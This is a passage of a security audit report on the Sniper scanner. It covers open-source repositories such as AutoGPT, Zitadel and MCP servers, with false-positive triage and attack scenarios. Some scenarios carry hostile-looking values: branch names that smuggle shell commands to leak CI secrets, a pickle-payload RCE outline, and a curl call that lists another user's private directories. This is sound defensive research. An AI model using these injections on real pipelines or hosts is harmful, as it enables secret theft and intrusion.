# Gökçe Baran Karakamış — Sniper macOS Installation Verification, Scanned Open-Source Repositories & Verified Security Advisories Report

**English** | [Türkçe](SNIPER-TARANAN-DEPOLAR-VE-BAGLANTILI-ACIKLAR.md) | [日本語](SNIPER-SCANNED-REPOSITORIES-AND-ADVISORIES.ja.md) | [简体中文](SNIPER-SCANNED-REPOSITORIES-AND-ADVISORIES.zh-CN.md) | [한국어](SNIPER-SCANNED-REPOSITORIES-AND-ADVISORIES.ko.md)

**Author / Security Researcher:** **Gökçe Baran Karakamış** ([@dytredline](https://github.com/dytredline))

This comprehensive technical guide and security research report consists of three main parts:
1. **Part I — Real-Hardware macOS (Apple Silicon) Installation & Runtime Verification Report:** End-to-end testing and verification results of Sniper Community on real macOS hardware across both **Native Source Setup (`--core-only`)** and the **Docker Desktop 5-Engine (`community-tools`)** profile.
2. **Part II — 8 Open-Source Repositories Scanned with Sniper, Vulnerability Mechanics & Everyday Scenarios:** Source-code-level audit of **8 open-source repositories** scanned by **Gökçe Baran Karakamış** using the **Sniper** static analysis (SAST), infrastructure-as-code (IaC), and software composition analysis (SCA) engine — including false-positive elimination, plain-language explanations of how each code/configuration pattern turns into a vulnerability, **3 concrete everyday critical scenarios (`Scenario A / B / C`)** per repository, and **example execution & verification commands**.
3. **Part III — 11 Verified Vulnerabilities Discovered in Our Sniper Scans (`01`..`11`), Code Mechanics, Scenarios & Runtime Proofs (`RED -> GREEN + BENIGN`):** Complete technical analysis of **11 verified security vulnerabilities** discovered across 6 open-source projects (**Stirling-PDF, TryCua `cua`, OpenZiti, n8n, Gotify Server, NIIS X-Road**) and reported as GitHub Security Advisories (`GHSA`), explaining step by step how each bug occurs in code and turns into an exploitable vulnerability, **3 everyday critical scenarios (`Scenario A / B / C`)** for each finding, **example reproduction/verification commands**, and **runtime proofs (`RED -> GREEN + BENIGN`)**.

---

## Part I — Real-Hardware macOS (Apple Silicon) Installation & Verification Report (2026-10-24)

Installing Sniper on macOS (Apple Silicon) is **not experimental**; both **Native Source Setup (`--core-only`)** and the **Docker Desktop 5-Engine Setup** have been tested, verified, and are fully supported on real macOS hardware:

| Installation Path | Command | Scope Verified on Real macOS Hardware | Status |
| :--- | :--- | :--- | :---: |
| **1. Native macOS Source Setup** | `python3 scripts/setup-community --core-only` | `.venv` (CPython 3.12) creation, locked runtime dependency installation (`requirements-runtime.lock` + `pip check`), `scripts/sniper-mcp --help`, `scripts/sniper-project-audit --help`, `cli_reports.py --help`, local loopback web UI (`127.0.0.1:8787`), local SQLite state initialization, and real local SAST/dataflow audit on a sample project (`audit_id: prj_162d09c47587`, `baseline_id: prj_497a1c478d97` — detecting `[critical] Verified dataflow: request input reaches SQL query (SQL injection)` at `app.py:4` and recording the advisory). | **VERIFIED & SUPPORTED** |
| **2. macOS Apple Silicon + Docker Desktop 5-Engine Setup** | `./scripts/deploy-community-tools --accept-third-party-licenses` | SHA-256 digest-pinned runtime readiness checks (`precheck_passed`) for all 5 local engines (**Nuclei 3.11.1**, **Trivy 0.75.0**, **Gitleaks 8.30.1**, **TruffleHog 3.99.0**, **Opengrep 1.30.1**), multilingual web UI, project import into persistent volume (`sniper_projects`) via `./scripts/import-community-project`, local smoke tests across all 5 engines, and full test suite (**2,826 unittests: 0 errors; 203 pytest passed; 432 Node tests passed**). | **VERIFIED & SUPPORTED** |

For detailed verification logs, see [VALIDATION.md](../VALIDATION.md) and the platform installation guide in [DEPLOYMENT.md](../DEPLOYMENT.md).

---

## Part II — 8 Open-Source Repositories Scanned with Sniper & Potential Chained Vulnerabilities

For each repository, findings are categorized into **(A) Verified Dangerous Primitive / Hardening Gap**, **(B) Context-Dependent Finding & Dependency (SCA) Records**, and **(C) Confirmed False Positive**, followed by:
1. **How It Occurs in Code and Turns into a Vulnerability (Plain-Language Explanation)**,
2. **3 Critical Everyday Scenarios (`Scenario A / Scenario B / Scenario C`)**,
3. **Standalone & Combined (Chaining) Severity Analysis**,
4. **Example Execution & Verification Commands**.

> **Important Methodology & Responsible Disclosure Note:** In static analysis, the mere presence of a dangerous sink (`exec`, `pickle.loads`, `subprocess.Popen`) or CI/CD pattern does not automatically constitute a verified product CVE. For a finding to qualify as an exploitable vulnerability, **reachability**, **trust-boundary crossing**, and **attacker preconditions** in a default/supported deployment must be proven together. The **11 verified vulnerabilities** with full runtime proofs are presented in **Part III** of this document.

---

## 1. AutoGPT (`autogpt`)
* **SAST/IaC/SCA Summary:** `93` policy-exceeding findings (`2 critical, 39 high, 34 medium, 16 low, 2 info`); `142` total triage records (`3 likely_false, 139 uncertain`).

### A. Verified Hardening & Configuration Findings
1. **Hardcoded Secrets in Docker Compose Test/Local Environment Files (`CWE-798`):**
   * `autogpt_platform/backend/docker-compose.test.yaml:85` (`RABBITMQ_DEFAULT_PASS`), `docker-compose.journeys.yml:22,29`, and `docker-compose.yml:161`.
2. **Container Security Hardening Gaps (`CWE-250`, `CWE-1104`):**
   * `autogpt_platform/backend/Dockerfile:1`: Missing non-privileged `USER` directive (running as `root`) and unpinned `:latest` image tags in `docker-compose.platform.yml:148` / `docker-compose.yml:121`.

### B. Context-Dependent / Secondary Chain Findings
1. **Deserializing Scheduler State from Database via `pickle.loads` (`CWE-502`):**
   * `autogpt_platform/backend/backend/executor/jobstore_backfill.py:99`: Loads binary data from APScheduler's `apscheduler_jobs.job_state` column into memory via `pickle.loads(row.job_state)`.
2. **Contract Drift (OpenAPI vs. Code):**
   * `autogpt_platform/frontend/src/app/api/openapi.json:3589` and `backend/api/features/chat/share.py:170,186`: Shared chat endpoints (`/{share_token}`) are intentionally public (`public_router`), but out of sync with the OpenAPI schema.

### C. Confirmed False Positives
1. **Both Critical Findings Are False Positives (`obj.execute` Mistaken for SQLi):**
   * `autogpt_platform/backend/backend/api/external/v1/routes.py:131` and `autogpt_platform/backend/backend/api/features/blocks/routes.py:151` — `obj.execute(data, ...)` is not a SQL query; it is the Python method of AutoGPT's `Block` class.
2. **JWT Verification Alerts (`jwt.get_unverified_header`):**
   * `autogpt_platform/autogpt_libs/autogpt_libs/auth/jwt_utils.py:96`, `backend/integrations/webhooks/step_webhooks/service.py:57`, and `backend/copilot/bot/adapters/teams/auth.py:100` — All three validate the `alg` header against a strict allowlist (`RS256`) and perform full signature verification via `jwt.decode()`.
3. **Alleged "Unprotected Route" Alerts:**
   * `codex.py:48,70`, `integrations/router.py:942`, and `orgs/team_routes.py:102,168,224,246` — All enforce FastAPI `Security(get_user_id)` or `Security(get_request_context)` + `_authorize_team_management` authorization checks.
4. **Alleged Secret & Logging Alerts:**
   * `autogpt_platform/backend/backend/copilot/tools/ayrshare_managed.py:44` (`NO_API_KEY` English description string), `autogpt_platform/single-container/Dockerfile:29` (`BETTER_AUTH_SECRET=build-only-placeholder-not-used-at-runtime`), `oauth.py:452`, and `token_tracking.py:193` (logs token usage count `prompt_tokens`, not secret token values).

### D. How It Occurs in Code and Turns into a Vulnerability (Plain-Language Explanation)
Python's `pickle.loads()` function reconstructs serialized objects by executing any `__reduce__()` instruction embedded inside the byte stream — meaning it can execute arbitrary OS commands, not just read data. In AutoGPT's `jobstore_backfill.py:99`, the background job migration code runs:
```python
# autogpt_platform/backend/backend/executor/jobstore_backfill.py:95-102
for row in rows:
    # Deserializes the binary (BYTEA) column from apscheduler_jobs directly via pickle
    job_state = pickle.loads(row.job_state)
```
Under normal conditions, an external web user cannot write directly to this database table, so it is not a standalone unauthenticated RCE. **However**, if an operator deploys `docker-compose.yml` with its hardcoded default database/RabbitMQ passwords exposed on an internal network, or if a separate SQL injection / database credential leak occurs, an attacker can write a crafted `pickle` payload into `apscheduler_jobs.job_state`. When the background `executor` reads that row, it executes arbitrary commands **as `root` inside the container** because the `Dockerfile` omits a non-root `USER`.

### E. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Internal Network Deployment with Default Compose Passwords Chains Database Write into `root` RCE:**
  1. A team deploys the AutoGPT Platform on an internal server using the default `docker-compose.yml` settings, leaving the PostgreSQL port reachable on the internal network.
  2. An unauthorized internal user or compromised peer service connects to PostgreSQL using the default credentials and updates `apscheduler_jobs.job_state` with a malicious Python `pickle` payload invoking `os.system`.
  3. When the AutoGPT background worker (`jobstore_backfill.py:99`) scans the table, `pickle.loads(row.job_state)` executes as `root` inside the container, exposing all configured LLM API keys (`OPENAI_API_KEY`, `ANTHROPIC_API_KEY`).
* **Scenario B — Supply-Chain Drift via Unpinned `:latest` Container Image Tags:**
  1. A production deployment uses `:latest` tags in `docker-compose.platform.yml` and pulls a new upstream image during an automated restart.
  2. Without an immutable SHA-256 digest or version pin, a breaking upstream change or compromised tag rolls directly into production.
* **Scenario C — Accidental Exposure of Shared Chats Due to OpenAPI Schema vs. Code Contract Drift:**
  1. A security team reviews only `openapi.json`, assuming all chat endpoints require authentication, and configures their API gateway accordingly.
  2. In reality, `/{share_token}` routes in `backend/api/features/chat/share.py:170,186` are mounted on `public_router`, allowing anyone who obtains a share link to read shared agent outputs without logging in.

### F. Standalone & Combined (Chaining) Severity Analysis
* **Standalone Severity:** **Low / Medium.** Both reported critical SQLi findings are false positives; there is no verified direct external RCE/SQLi.
* **Does It Chain? (Conditional Attack Hypothesis — Combined Severity: MEDIUM / HIGH [Only With DB Write Access]):** `pickle.loads` in `jobstore_backfill.py:99` combines with default compose passwords and the `root` container to escalate database write access into full container compromise.

### G. Example Execution & Verification Commands
```bash
# 1. Run full Sniper SAST/IaC/SCA audit on the AutoGPT repository
python3 scripts/sniper-project-audit \
  --project-dir "$HOME/audit-targets/autogpt" \
  --output-json "$HOME/audit-targets/reports/autogpt-audit.json"

# 2. Verify false-positive obj.execute calls vs. real pickle.loads usage
grep -rn "pickle.loads" "$HOME/audit-targets/autogpt/autogpt_platform/backend/"
grep -rn "def execute(" "$HOME/audit-targets/autogpt/autogpt_platform/backend/backend/data/block.py"

# 3. Summarize policy-exceeding findings via Sniper CLI
python3 cli_reports.py --input "$HOME/audit-targets/reports/autogpt-audit.json" --min-severity medium
```

---

## 2. Zitadel (`zitadel`)
* **SAST/IaC/SCA Summary:** `67` policy-exceeding findings (`8 critical, 42 high, 5 medium, 11 low, 1 info`); `286` total triage records (`3 likely_true, 283 uncertain`).

### A. Verified Hardening & Example Deployment Findings
1. **Docker Socket Mount (`docker.sock`) in Example Compose Files:**
   * Three compose variants under `deploy/compose/` mount `/var/run/docker.sock` (a single root cause repeated across three variants).
2. **`NODE_TLS_REJECT_UNAUTHORIZED=0` in Documentation Reverse-Proxy Example & Startup Probe:**
   * `apps/docs/content/self-hosting/manage/reverseproxy/docker-compose.yaml:154` sets `NODE_TLS_REJECT_UNAUTHORIZED=0` (documentation example; separate from `deploy/compose/`).
   * `apps/login/scripts/server.mjs:45`: `pollReady()` local startup health check uses `rejectUnauthorized: false`.

### B. Context-Dependent Findings
* **Optional Unencrypted OpenTelemetry (OTLP) gRPC/HTTP Export (`CWE-319`):**
   * `logger.go:94,110`, `metric.go:269,290`, and `tracing.go:214,230`: `WithInsecure()` is enabled only if an administrator explicitly sets `cfg.Insecure = true`.

### C. Confirmed False Positives
1. **All 8 Critical Findings Are False Positives:**
   * `backend/v3/storage/database/dialect/postgres/conn.go:46`, `pool.go:54`, `tx.go:59`: Parameterized `QueryRow(ctx, sql, args...)` wrappers around the `pgx` database driver. Taint from `r.Method` in HTTP logging middleware was spuriously linked through generic `Info()`/`Add()` method names.
   * `cmd/initialise/helper.go:12` and `cmd/initialise/verify_database.go:79`: Startup database initialization helper `exec(ctx, db, ...)`, not dynamic code execution (`eval`/`exec`).
2. **High-Severity "String Concatenation in SQL Query" Alerts:**
   * `internal/api/grpc/user/query.go:125`, `v2/convert/user.go:169,175,181`, and `intent_test.go:296`: Go functions converting Protobuf search objects (`AndQuery`, `OrQuery`, `NotQuery`) into internal query structs without SQL string concatenation (in `intent_test.go:296`, URL concatenation `authUrl.Scheme+"://"+authUrl.Host` was mistaken for SQL).
3. **Hardcoded Password Strings in Unit Tests:** Test literals inside `password-complexity.test.tsx`, `validators.test.ts`, and `password_test.go`.

### D. How It Occurs in Code and Turns into a Vulnerability (Plain-Language Explanation)
Zitadel is an identity and access management (IAM / SSO) server. Its core Go codebase uses parameterized `pgx` queries safely. However, its example deployment and documentation files contain two risky configuration patterns:
1. Mounting `/var/run/docker.sock` inside containers under `deploy/compose/`: On Linux, any process with write access to the Docker socket can spawn a privileged (`--privileged`) container mounting the host root filesystem, immediately gaining `root` on the host machine.
2. Setting `NODE_TLS_REJECT_UNAUTHORIZED=0` for the Node.js login UI (`zitadel-login`) in `apps/docs/content/self-hosting/manage/reverseproxy/docker-compose.yaml:154`: This environment variable disables TLS certificate verification across the entire Node.js process. If an operator copies this documentation snippet into production where `zitadel-login` communicates with the backend Zitadel API over a network, a man-in-the-middle (MITM) attacker can intercept OAuth2/OIDC login traffic using a self-signed certificate.

### E. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Operator Copies Documentation Reverse-Proxy Compose Example with `NODE_TLS_REJECT_UNAUTHORIZED=0` into Production:**
  1. A DevOps engineer sets up Zitadel using `reverseproxy/docker-compose.yaml` from the official documentation as a template and leaves `NODE_TLS_REJECT_UNAUTHORIZED=0` enabled in production.
  2. TLS certificate validation is disabled for all outgoing HTTPS requests from the `zitadel-login` container.
  3. An attacker capable of ARP/DNS spoofing on the network path presents a rogue TLS certificate and captures user passwords and session tokens in cleartext.
* **Scenario B — Container-to-Host Root Escape via `docker.sock` Mount on a Shared Server:**
  1. A staging or small production environment runs the template under `deploy/compose/` directly with `/var/run/docker.sock` mounted.
  2. Any secondary compromise or misconfiguration in the container with socket access allows the attacker to invoke the Docker API and gain full `root` access to `/etc/shadow` and all sibling containers on the host.
* **Scenario C — Sensitive Telemetry Exposure via `cfg.Insecure = true` OpenTelemetry Export:**
  1. For debugging, an administrator sets `Insecure: true` in `tracing.go:214` / `logger.go:94` and exports OTLP spans over unencrypted gRPC to a central collector.
  2. Listeners on the same data-center network segment can read authentication metadata and user identifiers from cleartext traffic.

### F. Standalone & Combined (Chaining) Severity Analysis
* **Standalone Severity:** **Low / Medium.** There is no exploitable SQLi or RCE in Zitadel's core Go/TypeScript code.
* **Does It Chain?** The `docker.sock` mount (`deploy/compose/`) and `NODE_TLS_REJECT_UNAUTHORIZED=0` (`apps/docs/.../reverseproxy/docker-compose.yaml`) are in **different compose examples** and do not combine by default, though combining them in a custom production deployment compounds the risk.

### G. Example Execution & Verification Commands
```bash
# 1. Run Sniper SAST/IaC audit on the Zitadel repository
python3 scripts/sniper-project-audit \
  --project-dir "$HOME/audit-targets/zitadel" \
  --output-json "$HOME/audit-targets/reports/zitadel-audit.json"

# 2. Verify docker.sock mounts and NODE_TLS_REJECT_UNAUTHORIZED=0 in compose files
grep -rn "docker.sock" "$HOME/audit-targets/zitadel/deploy/compose/"
grep -rn "NODE_TLS_REJECT_UNAUTHORIZED" "$HOME/audit-targets/zitadel/apps/docs/"

# 3. Inspect parameterized pgx wrappers to confirm false positives
sed -n '40,65p' "$HOME/audit-targets/zitadel/backend/v3/storage/database/dialect/postgres/conn.go"
```

---

## 3. Nextcloud MCP Server (`nextcloud-mcp-v0.201.0-8064f66`)
* **SAST/IaC/SCA Summary:** `59` policy-exceeding findings (`SAST: 1 critical, 6 high, 36 medium, 2 low` · `IaC: 7 high, 1 info` · `SCA: 5 critical, 40 high, 30 medium`).

### A. Verified Hardening Findings
1. **CI/CD `.github/workflows/pact.yml:93` Branch Name Shell Interpolation (`CWE-78` — Same-Repo Scoped Hardening):**
   * `.github/workflows/pact.yml:93` interpolates `--branch "${{ github.head_ref || github.ref_name }}"` directly inside a `run:` shell script.
   * **Evidence Audit Correction:** The workflow **does not use** `pull_request_target` (triggers are `pull_request` and `push`), and lines `35` and `102` enforce `if: ${{ github.event_name == 'push' || github.event.pull_request.head.repo.full_name == github.repository }}`, preventing execution on **external fork PRs**. Thus there is no external fork-PR secret-theft chain; it is an internal same-repo shell hardening item.

### B. Context-Dependent Findings & SCA Records
* **Test/Development Environment Hardcoded Secrets:** `docker-compose.yml` and `app-hooks/post-installation/15-setup-keycloak-provider.sh` / `scripts/provision-greenmail-account.sh` are local test/development provisioning scripts.
* **SCA Dependency Records (`uv.lock`):** Records for `pillow 11.3.0`, `pyjwt 2.13.0`, `certifi 2026.6.17`, `cryptography 49.0.0`, and `fsspec 2026.4.0`.

### C. Confirmed False Positives
1. **Login Flow v2 `poll.endpoint` SSRF Alert (`login_flow.py:192` — Proven False Positive via End-to-End Call Chain):**
   * The only callers of `poll(self, poll_endpoint: str, poll_token: str)` in `nextcloud_mcp_server/auth/login_flow.py:173-195` across the entire repository are `provision_routes.py:102` (`_poll_and_store`) and `server/auth_tools.py:304` (`nc_auth_check_status`).
   * Both callers obtain `poll_endpoint` from `flow_client.initiate()` (`login_flow.py:125-151`), not from external user input.
   * At `login_flow.py:130`, `initiate()` executes **`poll_endpoint = self._rewrite_to_nextcloud_host(raw_poll_endpoint)`**, which forcibly overwrites the URL's `scheme` and `netloc` (`host:port`) with the server's configured `self.nextcloud_host` (`rewrite_url_origin`). Consequently, `poll()` can never send an SSRF request to an arbitrary host or internal IP.
2. **JWT Signature Verification Alert (`token_utils.py:178`):** `nextcloud_mcp_server/auth/token_utils.py:178-205` — `jwt.get_unverified_header(id_token)` is used solely to select `kid` from the JWKS key set, immediately followed by full signature verification against an OIDC algorithm allowlist.

### D. How It Occurs in Code and Turns into a Vulnerability (Plain-Language Explanation)
In GitHub Actions workflows, expressions such as `${{ github.head_ref }}` are textually expanded **before** the bash script runs. At `.github/workflows/pact.yml:93`:
```yaml
# .github/workflows/pact.yml:90-95
- name: Publish Pact
  run: |
    pact-broker publish ./pacts \
      --consumer-app-version "${{ github.sha }}" \
      --branch "${{ github.head_ref || github.ref_name }}"
```
If a branch name contains shell metacharacters such as `feat/$(id)` or `feat";curl ...;#`, bash evaluates `$(...)` or breaks out of the double quotes (`"..."`) and executes the injected command. Currently, external fork PRs are blocked by the `github.event.pull_request.head.repo.full_name == github.repository` guard. **However**, if a developer removes that `if:` condition to enable Pact tests on external PRs, or if a restricted account/bot with branch-creation rights inside the repository is compromised, a crafted branch name can exfiltrate `PACT_BROKER_TOKEN` and repository secrets.

### E. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Restricted Contributor Account Uses Crafted Branch Name to Exfiltrate Protected CI Secrets:**
  1. An account with permission to push feature branches (but no access to `main` or repository settings/secrets) is compromised.
  2. The attacker pushes a branch named `fix";env|base64;#`, triggering shell interpolation in `pact.yml:93` and leaking CI runtime secrets.
* **Scenario B — Copying Local Test Provisioning Scripts (`15-setup-keycloak-provider.sh`) into Production:**
  1. An administrator integrating Nextcloud MCP Server with OIDC/Keycloak runs the repository's `docker-compose.yml` and `15-setup-keycloak-provider.sh` script directly on a production host without changing its defaults.
  2. Hardcoded `client_secret` and admin credentials remain active in the production Keycloak realm, allowing anyone familiar with the public repo to impersonate the OAuth client.
* **Scenario C — Outdated `pillow` and `cryptography` Packages in `uv.lock` Triggered During Document/Image Processing:**
  1. Nextcloud MCP Server processes images and documents stored in a user's Nextcloud account using `pillow` to summarize them for an AI agent.
  2. If deployed from the unupdated `uv.lock`, a malformed image uploaded to a shared Nextcloud folder can trigger known memory-safety bugs and crash the MCP server.

### F. Standalone & Combined (Chaining) Severity Analysis
* **Standalone & Combined Severity:** **Low (Hardening).** Both `pact.yml` (closed to external forks) and `login_flow.py:192` (pinned to `self.nextcloud_host` origin in `initiate()`) are protected against external exploitation.

### G. Example Execution & Verification Commands
```bash
# 1. Run Sniper SAST/IaC/SCA audit on the Nextcloud MCP repository
python3 scripts/sniper-project-audit \
  --project-dir "$HOME/audit-targets/nextcloud-mcp-v0.201.0-8064f66" \
  --output-json "$HOME/audit-targets/reports/nextcloud-mcp-audit.json"

# 2. Verify _rewrite_to_nextcloud_host origin pinning in login_flow.py
sed -n '125,195p' "$HOME/audit-targets/nextcloud-mcp-v0.201.0-8064f66/nextcloud_mcp_server/auth/login_flow.py"

# 3. Inspect same-repo condition and shell interpolation in pact.yml
sed -n '30,105p' "$HOME/audit-targets/nextcloud-mcp-v0.201.0-8064f66/.github/workflows/pact.yml"
```

---

## 4. MCPJam Inspector (`mcpjam-inspector-v3.9.2-eda1fd1`)
* **SAST/IaC/SCA Summary:** `122` policy-exceeding findings (`SAST: 12 critical, 8 high, 74 medium, 6 low` · `IaC: 2 medium, 3 info` · `SCA: 6 critical, 96 high, 197 medium, 40 low`).

### A. Verified Hardening Findings
1. **CI/CD `.github/workflows/pr-preview.yml:116` Branch Name Shell Interpolation (`Same-Repo Scoped`):**
   * `.github/workflows/pr-preview.yml:116` executes `echo "branch=${{ github.event.pull_request.head.ref }}" >> "$GITHUB_OUTPUT"` directly inside a shell block.
   * **Evidence Audit Correction:** `pr-preview.yml` **does not use** `pull_request_target` (triggers are `pull_request` and `repository_dispatch`), and lines `65-69` enforce `github.event.pull_request.head.repo.full_name == github.repository` while excluding `dependabot[bot]`. External fork PRs cannot trigger this job; it is a shell-hardening item for same-repo branch creators.

### B. Context-Dependent Findings & SCA Records
* **`dependabot-auto-merge.yml:25` (`pull_request_target`):** `.github/workflows/dependabot-auto-merge.yml:15-40` uses `pull_request_target`, but as noted in its security comment, it **contains no `actions/checkout` step** and is restricted by `if: github.event.pull_request.user.login == 'dependabot[bot]'`.
* **SCA Dependency Records (`package-lock.json`):** Records for `handlebars 4.7.9`, `shell-quote 1.10.0`, `tinypool 1.1.1`, and `@modelcontextprotocol/sdk`.

### C. Confirmed False Positives (`18 of 20 Critical/High SAST Findings`)
1. **Words `eval (` and `exec (` Inside Code Comments (11 Critical + 3 High False Alarms):**
   * All **11 critical `Dynamic code execution`** alerts at `mcpjam-inspector/client/src/lib/webmcp/groups/swarms.ts:22`, `evals-runner.ts:4261,6501`, `drive-hosted-eval-turn.ts:497,777,867`, `step-executor.ts:367`, `mcp-app-browser-harness.ts:1010`, `sandbox-proxy-csp.ts:7`, and `seed-host-template.ts:645,902` match English JSDoc/comments containing `"eval ("` or `"eval()"` (e.g., `// Browser-rendered MCP App eval (PR 14):`), not executable code.
   * All **3 high `Shell command execution`** alerts at `mcpjam-inspector/server/routes/web/computers.ts:16` (`* POST /exec (bearer)`), `e2b-sandbox-provider.ts:15` (`* exec (run) / spawn`), and `materialize-skill-files.ts:37` (`* binary write + exec (for stale-file prune)`) are also JSDoc comments.
2. **Generated `.d.ts` Type Definition File (2 High False Alarms):** `mcp/worker-configuration.d.ts:3072,11962` — TypeScript interface definitions generated by Cloudflare Wrangler, not runtime code.
3. **UI Label Text & Client String Concatenation (2 High False Alarms):** `ServerUrlChangeHistory.tsx:60` (`client_secret: "OAuth client secret"` UI label) and `useToolExecution.ts:571` (client-side UI string concatenation, not a SQL query).

### D. How It Occurs in Code and Turns into a Vulnerability (Plain-Language Explanation)
MCPJam Inspector is a tool for testing and running evaluations (*evals*) on MCP servers. Because developers wrote English comments such as `eval (PR 14)` or `exec (bearer)`, naive regex scanners mistook those comments for JavaScript's `eval()` function and generated 14 false alarms. The real actionable code pattern is in `.github/workflows/pr-preview.yml:116`:
```yaml
# .github/workflows/pr-preview.yml:114-118
- name: Extract branch name
  id: extract_branch
  run: |
    echo "branch=${{ github.event.pull_request.head.ref }}" >> "$GITHUB_OUTPUT"
```
Here, the PR branch name is interpolated directly into `echo "..."`, alongside outdated NPM dependencies in `package-lock.json` (`shell-quote 1.10.0`, `handlebars 4.7.9`). While external forks are blocked at lines `65-69`, same-repo branch names or unpatched transitive NPM packages create secondary exposure if untrusted MCP server payloads are inspected.

### E. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Preview Deployment Workflow Branch-Name Injection Leaks Cloudflare / Preview Secrets:**
  1. An internal automation bot or contributor with branch permissions opens a PR whose branch name includes shell metacharacters (`feat/$(...)`).
  2. When `echo "branch=${{ github.event.pull_request.head.ref }}"` executes in `pr-preview.yml:116`, the injected command can access preview deployment tokens.
* **Scenario B — Outdated `shell-quote` and `handlebars` Dependencies in `package-lock.json` Triggered During Local MCP Inspection:**
  1. A developer launches MCPJam Inspector locally to inspect the schema and command templates of an untrusted third-party MCP server.
  2. If server responses are parsed through outdated `shell-quote` or template helpers, known dependency flaws can cause unexpected shell argument escaping issues or prototype pollution.
* **Scenario C — Alert Fatigue from Comment-Based `eval (` False Positives Masking Real CI & Dependency Issues:**
  1. A security team sees 12 critical `eval(` alerts, inspects the first 10, realizes they are JSDoc comments, and dismisses the entire report as noise.
  2. Consequently, the real shell interpolation in `pr-preview.yml:116` and the 6 critical SCA dependency vulnerabilities in `package-lock.json` remain unpatched.

### F. Standalone & Combined (Chaining) Severity Analysis
* **Standalone & Combined Severity:** **Low / Medium (Hardening).** 18 of 20 critical/high SAST findings are confirmed false positives, and the remaining 2 CI workflow findings block external forks and avoid checking out untrusted PR code.

### G. Example Execution & Verification Commands
```bash
# 1. Run Sniper SAST/IaC/SCA audit on the MCPJam Inspector repository
python3 scripts/sniper-project-audit \
  --project-dir "$HOME/audit-targets/mcpjam-inspector-v3.9.2-eda1fd1" \
  --output-json "$HOME/audit-targets/reports/mcpjam-audit.json"

# 2. Verify false-positive "eval (" strings inside JSDoc comments
sed -n '18,26p' "$HOME/audit-targets/mcpjam-inspector-v3.9.2-eda1fd1/client/src/lib/webmcp/groups/swarms.ts"

# 3. Check the same-repo guard and line 116 in pr-preview.yml
sed -n '60,120p' "$HOME/audit-targets/mcpjam-inspector-v3.9.2-eda1fd1/.github/workflows/pr-preview.yml"
```

---

## 5. Codebase Memory MCP (`codebase-memory-mcp-v0.9.0-b637e33`)
* **SAST/IaC/SCA Summary:** `32` policy-exceeding findings (`SAST: 17 critical, 7 high, 88 medium, 9 low` · `IaC: 5 medium, 1 low, 5 info` · `SCA: 8 high, 10 medium, 1 low`).

### A. Verified Local Service Design Boundary
1. **Local UI Directory Browsing Endpoint (`GET /api/browse?path=...`):**
   * `src/ui/http_server.c:668-730`: When running in `--ui` mode (`127.0.0.1`), lists subdirectory names under the `path` parameter for the GUI folder picker.
   * **Evidence Audit Correction (CORS & DNS Rebinding Protection):** `update_cors()` in `src/ui/http_server.c:78-93` **DOES NOT USE `Access-Control-Allow-Origin: *`**. It reflects only `http://localhost:*` and `http://127.0.0.1:*` origins, omits CORS headers for external websites, and restricts the `Host` header to `localhost`/`127.0.0.1`/`::1` (rejecting foreign hosts/DNS-rebinding requests with `403`). Therefore, a remote website cannot exfiltrate local directories over CORS.

### B. Context-Dependent Findings & Vendored Code Warnings
* **Vendored C Libraries & Grammars:** Classic C `strcpy` warnings inside `vendored/yyjson`, `vendored/tre`, `internal/cbm/vendored/grammars/*`, and the Windows compatibility layer (`src/foundation/compat.c:84,109`).
* **SCA Records (`graph-ui/package-lock.json`):** Frontend/development package advisories for `nanoid`, `postcss`, and `browserslist`.

### C. Confirmed False Positives
1. **Critical SQL Injection Alert (`src/store/store.c:2864`):** Inspection of `src/store/store.c:2845-2877` confirms that in the `snprintf`-constructed recursive BFS query, `start_id`, `max_depth`, and `max_results` are integers (`%lld`, `%d`), `join_cond` and `next_id` are constant C strings, and `edge_types` values are bound via parameterized `?` placeholders using `bind_text()`.
2. **Comment & Security Script Alerts (`c_lsp.h:54`, `security-install.sh:132`):** `internal/cbm/lsp/c_lsp.h:54` is a C comment mentioning `sprintf("%s.%s")`; `scripts/security-install.sh:132` is the security audit script's own `for pattern in 'system(' 'eval(' 'exec('` loop.
3. **Pre-Sized Buffer `strcpy`/`strcat` Alerts (`kotlin_lsp.c:1541-1542`, `py_lsp.c:2055`, `store.c:4482-4484`):** In `kotlin_lsp.c` and `py_lsp.c`, the buffer is allocated on the immediately preceding line with `strlen(...) + 1`; in `store.c:4482-4484`, `split_path_parts` splits `tmp[CBM_SZ_512]` in place, making overflow of `dir[CBM_SZ_512]` mathematically impossible.
4. **Alleged Use-After-Free (`vendored/tre/xmalloc.c:347`) & Constant-URL `curl` (`src/mcp/mcp.c:5997`):** `xmalloc.c:347` removes the old pointer value as a key from a debug hash table (`hash_table_del`) after `realloc` without dereferencing it; `mcp.c:5997` invokes `curl` against a constant `UPDATE_CHECK_URL` with no user input.
5. **High-Severity `_cli.py` Alerts:** `pkg/pypi/src/codebase_memory_mcp/_cli.py:57,70` — Package installation/launcher wrapper.

### D. How It Occurs in Code and Turns into a Vulnerability (Plain-Language Explanation)
Codebase Memory MCP is a local code-graph server written in C and Go. When started with `--ui`, it binds a local web UI on `127.0.0.1` and exposes `GET /api/browse?path=/...` (`src/ui/http_server.c:668-730`) for the folder picker. At first glance, one might ask whether a malicious website can call `fetch('http://127.0.0.1:.../api/browse?path=/home/community-user')` from the user's browser. Inspecting `update_cors()` and `Host` validation in C shows:
```c
/* src/ui/http_server.c:78-93 — Strict localhost / 127.0.0.1 Origin allowlist */
if (strncmp(origin, "http://localhost:", 17) == 0 ||
    strncmp(origin, "http://127.0.0.1:", 17) == 0) {
    snprintf(cors_header, sizeof(cors_header), "Access-Control-Allow-Origin: %s\r\n", origin);
}
```
Foreign origins receive no CORS headers, and non-loopback `Host` headers receive `403 Forbidden`. This endpoint only turns into a vulnerability if **another local user on a shared multi-user Linux host**, **another untrusted local web app running on `http://localhost:<other-port>`**, or **a misconfigured reverse proxy** can reach `127.0.0.1`.

### E. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Other Local Users on a Shared Multi-User Linux Server Enumerate Private Directory Names:**
  1. On a shared university or corporate Linux server, User A starts `codebase-memory-mcp --ui`.
  2. User B on the same machine calls `curl "http://127.0.0.1:<port>/api/browse?path=/home/community-user/private-project"`, listing User A's directory structure and triggering indexing jobs.
